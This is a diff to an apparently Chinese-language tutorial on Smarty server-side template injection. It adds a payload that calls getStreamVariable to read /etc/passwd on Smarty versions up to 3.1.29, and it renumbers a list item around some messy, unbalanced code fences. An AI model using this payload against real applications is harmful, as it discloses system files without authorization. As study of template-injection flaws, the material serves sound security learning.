@@ -23,6 +23,14 @@ $smarty->display('string:'.$ip);
 
 可利用的方法：
 1. `getStreamVariable()`读文件:
+   payload：
+   ```php
+   
+   
+   {self::getStreamVariable("file:///etc/passwd")}`
+   ```
+   ```
+   
    ```php
    public function getStreamVariable($variable)
 {
@@ -45,5 +53,5 @@ $smarty->display('string:'.$ip);
 //值得注意的是$variable就是我们要传递的文件的路径。
    ```
    这个方法之存在于`Smarty<=3.1.29`的版本，在Smarty 3.1.30版本中官方以及删除这个方法。
-2. `writeFile()`方法:
+3. `writeFile()`方法:
    
